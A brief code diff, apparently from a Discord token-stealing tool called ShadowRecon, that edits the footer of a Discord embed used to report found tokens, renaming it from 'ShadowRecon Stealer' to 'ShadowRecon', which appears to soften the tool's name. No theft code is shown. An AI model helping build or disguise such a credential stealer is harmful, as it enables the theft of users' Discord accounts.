@@ -629,7 +629,7 @@ This file indicates that the Discord module found tokens but couldn't process th
                 icon_url: avatarUrl
             },
             footer: {
-                text: "ShadowRecon Stealer"
+                text: "ShadowRecon"
             },
             timestamp: new Date().toISOString(),
             thumbnail: {
